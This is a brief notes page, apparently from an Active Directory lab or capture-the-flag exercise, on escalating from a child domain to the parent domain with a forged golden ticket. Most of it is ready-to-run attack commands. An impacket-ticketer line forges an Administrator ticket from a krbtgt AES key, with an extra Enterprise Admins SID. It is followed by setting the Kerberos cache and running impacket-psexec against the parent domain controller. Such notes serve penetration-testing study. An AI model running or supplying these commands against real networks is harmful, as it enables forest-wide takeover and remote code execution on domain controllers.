# Abusing Parent-Child Domain Using Golden Ticket

![image.png](image.png)

https://0xdeaddood.rocks/2023/05/11/forging-tickets-in-2023/

using the krbtgt hash the one with aes256

follow the above link as advised in child and parent domain we have to create a golden ticket and hop to other dc in that same way we do it from linux using impacket-ticker the command are given below 

impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 -domain sub.poseidon.yzx -domain-sid S-1-5-21-4168247447-1722543658-2110108262 -extra-sid S-1-5-21-1190331060-1711709193-932631991-519 Administrator -extra-pac

![image.png](image%201.png)

export KRB5CCNAME=Administrator.ccache

![image.png](image%202.png)

impacket-psexec sub.poseidon.yzx/Administrator@dc01.poseidon.yzx -k -no-pass -target-ip 192.168.162.161